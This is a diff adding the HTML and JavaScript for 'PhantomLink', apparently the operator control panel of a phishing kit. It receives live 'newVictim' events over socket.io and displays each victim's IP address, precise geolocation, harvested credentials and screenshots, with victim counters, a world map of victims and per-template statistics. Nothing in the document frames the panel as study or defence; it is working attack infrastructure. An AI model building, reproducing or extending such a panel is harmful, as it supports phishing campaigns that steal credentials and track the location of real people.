@@ -1,0 +1,379 @@
+  <!DOCTYPE html>
+  <html lang="en">
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PhantomLink • Vision Control</title>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  :root {
+    --bg:
+      radial-gradient(1200px 800px at 20% -10%, #1b2755 0%, transparent 60%),
+      radial-gradient(1000px 600px at 90% 10%, #0f3c5c 0%, transparent 55%),
+      linear-gradient(180deg, #05070e, #03040a);
+
+    --glass-weak: rgba(255,255,255,0.06);
+    --glass-mid: rgba(255,255,255,0.1);
+    --glass-strong: rgba(255,255,255,0.14);
+    --glass-border: rgba(255,255,255,0.28);
+
+    --blur-xl: blur(36px);
+    --blur-lg: blur(28px);
+
+    --text-main: #ffffff;
+    --text-muted: rgba(255,255,255,0.55);
+
+    --accent: #6cb6ff;
+    --accent-soft: rgba(108,182,255,0.35);
+  }
+
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: Inter, -apple-system, BlinkMacSystemFont, sans-serif;
+    background: var(--bg);
+    color: var(--text-main);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  header {
+    padding: 90px 20px 60px;
+    text-align: center;
+  }
+
+  h1 {
+    font-size: clamp(3.4rem, 6vw, 5rem);
+    font-weight: 900;
+    letter-spacing: 0.22em;
+    background: linear-gradient(90deg,#ffffff,#bcdcff);
+    -webkit-background-clip: text;
+    color: transparent;
+  }
+
+  header p {
+    margin-top: 18px;
+    font-size: .95rem;
+    color: var(--text-muted);
+    letter-spacing: .04em;
+  }
+
+  .stats {
+    display: flex;
+    justify-content: center;
+    gap: 28px;
+    margin-top: 55px;
+    flex-wrap: wrap;
+  }
+
+  .stat {
+    min-width: 240px;
+    padding: 28px 32px;
+    border-radius: 30px;
+    background:
+      linear-gradient(180deg, var(--glass-strong), var(--glass-weak));
+    backdrop-filter: var(--blur-xl);
+    border: 1px solid var(--glass-border);
+    box-shadow:
+      0 40px 120px rgba(0,0,0,.55),
+      inset 0 1px 0 rgba(255,255,255,.35);
+    text-align: center;
+    transition: transform .4s ease, box-shadow .4s ease;
+  }
+
+  .stat:hover {
+    transform: translateY(-6px);
+    box-shadow: 0 55px 160px rgba(0,0,0,.7);
+  }
+
+  .stat-value {
+    font-size: 3rem;
+    font-weight: 700;
+    color: var(--accent);
+    text-shadow: 0 0 30px var(--accent-soft);
+  }
+
+  .stat-label {
+    margin-top: 8px;
+    font-size: .8rem;
+    letter-spacing: .08em;
+    color: var(--text-muted);
+  }
+
+  .container {
+    max-width: 1800px;
+    margin: auto;
+    padding: 30px;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 30px;
+  }
+
+  .panel {
+    background:
+      linear-gradient(180deg, var(--glass-mid), var(--glass-weak));
+    backdrop-filter: var(--blur-lg);
+    border: 1px solid var(--glass-border);
+    border-radius: 32px;
+    padding: 30px;
+    box-shadow:
+      0 50px 140px rgba(0,0,0,.6),
+      inset 0 1px 0 rgba(255,255,255,.3);
+  }
+
+
+  h2 {
+    font-size: .85rem;
+    font-weight: 700;
+    letter-spacing: .18em;
+    text-transform: uppercase;
+    color: #cfe7ff;
+    margin-bottom: 22px;
+  }
+
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: .8rem;
+  }
+
+  th, td {
+    padding: 14px 12px;
+    border-bottom: 1px solid rgba(255,255,255,.08);
+    vertical-align: top;
+  }
+
+  th {
+    font-weight: 600;
+    color: var(--text-muted);
+  }
+
+  td pre {
+    font-size: 11px;
+    max-height: 150px;
+    overflow: auto;
+    margin: 0;
+  }
+
+  #map {
+    height: 440px;
+    border-radius: 26px;
+    overflow: hidden;
+  }
+
+  #chartCanvas {
+    border-radius: 26px;
+  }
+
+
+  #screenshots {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+    gap: 20px;
+  }
+
+  #screenshots img {
+    width: 100%;
+    border-radius: 26px;
+    border: 1px solid rgba(255,255,255,.25);
+    box-shadow: 0 35px 90px rgba(0,0,0,.7);
+  }
+
+  .status {
+    position: fixed;
+    bottom: 28px;
+    left: 50%;
+    transform: translateX(-50%);
+    padding: 18px 40px;
+    border-radius: 50px;
+    background: rgba(0,0,0,.45);
+    backdrop-filter: blur(26px);
+    border: 1px solid var(--glass-border);
+    font-weight: 600;
+    letter-spacing: .06em;
+    box-shadow: 0 35px 100px rgba(0,0,0,.8);
+  }
+
+
+  @media(max-width:1200px){
+    .container {
+      grid-template-columns: 1fr;
+    }
+  }
+  </style>
+  </head>
+
+  <body>
+
+  <header>
+    <h1>PHANTOMLINK</h1>
+    <p>Vision-Grade Control Center</p>
+
+    <div class="stats">
+      <div class="stat">
+        <div class="stat-value" id="total">0</div>
+        <div class="stat-label">TOTAL VICTIMS</div>
+      </div>
+      <div class="stat">
+        <div class="stat-value" id="today">0</div>
+        <div class="stat-label">TODAY</div>
+      </div>
+      <div class="stat">
+        <div class="stat-value" id="online">0</div>
+        <div class="stat-label">ONLINE</div>
+      </div>
+    </div>
+  </header>
+
+  <div class="container">
+
+    <div class="panel">
+      <h2>Live Victims</h2>
+      <table id="victimsTable">
+        <thead>
+          <tr>
+            <th>Time</th>
+            <th>Template</th>
+            <th>IP</th>
+            <th>Location</th>
+            <th>Geo</th>
+            <th>Credentials</th>
+            <th>Screenshot</th>
+          </tr>
+        </thead>
+        <tbody></tbody>
+      </table>
+    </div>
+
+    <div class="panel">
+      <h2>Statistics by Template</h2>
+      <canvas id="chartCanvas"></canvas>
+    </div>
+
+    <div class="panel">
+      <h2>World Map</h2>
+      <div id="map"></div>
+    </div>
+
+    <div class="panel">
+      <h2>Latest Screenshots</h2>
+      <div id="screenshots"></div>
+    </div>
+
+  </div>
+
+  <div class="status" id="status">LIVE • Waiting for victims…</div>
+
+  <script>
+  const socket = io();
+
+  const tableBody = document.querySelector('#victimsTable tbody');
+  const totalEl = document.getElementById('total');
+  const todayEl = document.getElementById('today');
+  const onlineEl = document.getElementById('online');
+  const statusEl = document.getElementById('status');
+  const screenshotsDiv = document.getElementById('screenshots');
+
+  let total = 0;
+  let todayCount = 0;
+  const today = new Date().toDateString();
+
+  const map = L.map('map').setView([20,0],2);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
+    attribution:'© OpenStreetMap'
+  }).addTo(map);
+  const markers = L.layerGroup().addTo(map);
+
+  const chartCtx = document.getElementById('chartCanvas').getContext('2d');
+  const chart = new Chart(chartCtx,{
+    type:'bar',
+    data:{
+      labels:[],
+      datasets:[{
+        label:'Victims per Template',
+        data:[],
+        backgroundColor:'#6cb6ff'
+      }]
+    },
+    options:{
+      responsive:true,
+      scales:{ y:{ beginAtZero:true } }
+    }
+  });
+
+  socket.on('newVictim', victim => {
+    total++;
+    totalEl.textContent = total;
+
+    if(new Date(victim.timestamp).toDateString() === today){
+      todayCount++;
+      todayEl.textContent = todayCount;
+    }
+
+    document.title = `(${total}) PhantomLink`;
+    statusEl.textContent = `LIVE • New victim from ${victim.ipLocation || 'Unknown'}`;
+
+    const geoText = victim.preciseGeolocation
+      ? typeof victim.preciseGeolocation === 'object'
+        ? `${victim.preciseGeolocation.latitude.toFixed(6)}, ${victim.preciseGeolocation.longitude.toFixed(6)}`
+        : victim.preciseGeolocation
+      : 'Not available';
+
+    const row = document.createElement('tr');
+    row.innerHTML = `
+      <td>${new Date(victim.timestamp).toLocaleString()}</td>
+      <td>${victim.template.toUpperCase()}</td>
+      <td>${victim.ip}</td>
+      <td>${victim.ipLocation}</td>
+      <td>${geoText}</td>
+      <td><pre>${JSON.stringify(victim.data,null,2)}</pre></td>
+      <td>${victim.screenshot ? `<img src="/captures/${victim.screenshot}" width="120">` : 'No'}</td>
+    `;
+    tableBody.prepend(row);
+
+    if(victim.preciseGeolocation && typeof victim.preciseGeolocation === 'object'){
+      L.marker([victim.preciseGeolocation.latitude, victim.preciseGeolocation.longitude])
+        .addTo(markers)
+        .bindPopup(`<b>${victim.template}</b><br>${victim.ip}`);
+    }
+
+    if(victim.screenshot){
+      const img = document.createElement('img');
+      img.src = `/captures/${victim.screenshot}`;
+      screenshotsDiv.prepend(img);
+    }
+
+    updateChart(victim.template);
+  });
+
+  function updateChart(template){
+    const index = chart.data.labels.indexOf(template);
+    if(index === -1){
+      chart.data.labels.push(template);
+      chart.data.datasets[0].data.push(1);
+    } else {
+      chart.data.datasets[0].data[index]++;
+    }
+    chart.update();
+  }
+
+  socket.on('stats', data => {
+    totalEl.textContent = data.totalVictims || 0;
+    onlineEl.textContent = data.online || 1;
+  });
+  </script>
+
+  </body>
+  </html>
